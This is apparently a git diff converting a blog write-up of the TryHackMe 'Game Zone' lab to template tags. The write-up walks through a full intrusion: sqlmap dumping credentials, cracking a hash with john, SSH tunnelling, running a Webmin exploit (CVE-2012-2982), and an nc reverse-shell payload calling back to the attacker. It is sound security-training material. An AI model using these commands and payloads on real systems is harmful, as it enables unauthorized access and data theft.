@@ -26,8 +26,7 @@ Let's hop on the highway to the game zone.  Hopefully.  Here we go.
 
 First step, as usual, is running the nmap to identify the services.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.221.104
 [sudo] password for kali: 
@@ -63,8 +62,8 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 27.68 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Check the Landing Page of the website.
@@ -123,10 +122,12 @@ Try to run a search request and intercept the request in the Burp.
 <br />
 Save the request to a text file called request.txt.
 
-{% raw %}
-```bash
+{% capture catrequesttxt %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
-└─$ cat request.txt             
+└─$ cat request.txt
+{% endcapture %}
+
+{% capture requesttxt %}
 POST /portal.php HTTP/1.1
 Host: 10.10.190.117
 Content-Length: 15
@@ -143,14 +144,16 @@ Cookie: PHPSESSID=583dqa4lotuo9sise19b4edrh7
 Connection: keep-alive
 
 searchitem=test
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catrequesttxt %}
+
+{% include codebox.html title="request.txt" content=requesttxt %}
 
 <br />
 Run sqlmap against the request that we just saved.
 
-{% raw %}
-```bash
+{% capture sqlmap %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ sqlmap -r request.txt --dbms=mysql --dump
         ___
@@ -182,24 +185,22 @@ Table: users
 [17:29:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.190.117'
 
 [*] ending @ 17:29:30 /2025-02-26/
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sqlmap %}
 
 <br />
 Create a file that contains the hash so we can feed it into a cracker.
 
-{% raw %}
-```bash
+{% capture savehash %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ echo 'agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14' > hash.txt
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=savehash %}
 
 <br />
 Use hash-identifier to try to identify the type of hash.
 
-{% raw %}
-```bash
+{% capture hashidentifier %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ hash-identifier                                                             
    #########################################################################
@@ -232,14 +233,13 @@ Least Possible Hashs:
 [+] SHA-256(md5($pass))
 [+] SHA-256(sha1($pass))
 --------------------------------------------------
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=hashidentifier %}
 
 <br />
 Run john the ripper to crack the hash.
 
-{% raw %}
-```bash
+{% capture johntheripper %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 hash.txt      
 Using default input encoding: UTF-8
@@ -251,14 +251,13 @@ videogamer124    (agent47)
 1g 0:00:00:00 DONE (2025-02-26 17:34) 4.000g/s 11796Kp/s 11796Kc/s 11796KC/s vimivi..vainlove
 Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
 Session completed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=johntheripper %}
 
 <br />
 SSH into the machine using our newly found, fancy credentials.
 
-{% raw %}
-```bash
+{% capture sshagent47 %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ ssh agent47@10.10.190.117                
 The authenticity of host '10.10.190.117 (10.10.190.117)' can't be established.
@@ -279,14 +278,13 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
 
 Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
 agent47@gamezone:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshagent47 %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 agent47@gamezone:~$ cat user.txt
 <redacted>
 agent47@gamezone:~$ ifconfig
@@ -307,14 +305,13 @@ lo        Link encap:Local Loopback
           TX packets:2016 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1 
           RX bytes:174164 (174.1 KB)  TX bytes:174164 (174.1 KB)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Run ss -tulpn to get a list of the ports that are listening.
 
-{% raw %}
-```bash
+{% capture sstulpn %}
 agent47@gamezone:~$ ss -tulpn
 Netid  State      Recv-Q Send-Q                                                                      Local Address:Port                                                                                     Peer Address:Port              
 udp    UNCONN     0      0                                                                                       *:50119                                                                                               *:*                  
@@ -325,14 +322,13 @@ tcp    LISTEN     0      128                                                    
 tcp    LISTEN     0      128                                                                                     *:22                                                                                                  *:*                  
 tcp    LISTEN     0      128                                                                                    :::80                                                                                                 :::*                  
 tcp    LISTEN     0      128                                                                                    :::22                                                                                                 :::*
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sstulpn %}
 
 <br />
 Create a local ssh tunnel that forwards port 10000 trough the SSH tunnel so we can view the website.
 
-{% raw %}
-```bash
+{% capture sshportforward %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ ssh -L 10000:localhost:10000 agent47@10.10.190.117
 agent47@10.10.190.117's password: 
@@ -348,8 +344,8 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
 
 Last login: Wed Feb 26 00:35:45 2025 from 10.4.119.29
 agent47@gamezone:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshportforward %}
 
 <br />
 Check the website in the web browser using localhost and the 10000 port.  The internal website traffic will get forwarded through the local SSH tunnel.
@@ -382,8 +378,7 @@ Look-up in Exploit-DB for our version of Webmin and find an authenticated exploi
 <br />
 Download the exploit.
 
-{% raw %}
-```bash
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ wget https://www.exploit-db.com/raw/50809 -O exploit.py                               
 --2025-02-26 18:12:04--  https://www.exploit-db.com/raw/50809
@@ -407,14 +402,13 @@ exploit.py                                                 100%[================
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  3897  100  3897    0     0   6873      0 --:--:-- --:--:-- --:--:--  6873
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploit %}
 
 <br />
-Since the box called for metasploit.  Give it a whirl.  I couldn't get it.  I gave up since we have the exploit.
+Since the box called for metasploit.  I gave it a whirl.  I couldn't get it.  I gave up since we have the exploit.
 
-{% raw %}
-```bash
+{% capture msfconsole %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ msfconsole -q
 msf6 > search webmin 1.580
@@ -531,20 +525,19 @@ msf6 exploit(unix/webapp/webmin_show_cgi_exec) > exploit
 [*] Attempting to execute the payload...
 [+] Payload executed successfully
 [*] Exploit completed, but no session was created.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=msfconsole %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Use revshells to generate a payload.
@@ -559,20 +552,18 @@ Use revshells to generate a payload.
 <br />
 Execute the python script.
 
-{% raw %}
-```bash
+{% capture runpythonscript %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ python3 CVE-2012-2982.py -t 127.0.0.1 -p 10000 -U agent47 -P videogamer124 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.119.29 443 >/tmp/f'
 [+] targeting host 127.0.0.1 on port 10000
 [+] successfully logged in with user 'agent47' and pw 'videogamer124'
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpythonscript %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchrootshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/gamezone]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
@@ -581,14 +572,13 @@ connect to [10.4.119.29] from (UNKNOWN) [10.10.190.117] 54152
 bash: cannot set terminal process group (1239): Inappropriate ioctl for device
 bash: no job control in this shell
 root@gamezone:/usr/share/webmin/file/#
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchrootshell %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 root@gamezone:/usr/share/webmin/file/# cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -606,8 +596,8 @@ ip a
        valid_lft forever preferred_lft forever
     inet6 fe80::1e:8dff:fe69:acfd/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that we smashed the game zone.  Thanks for reading along.  See you in the next one.
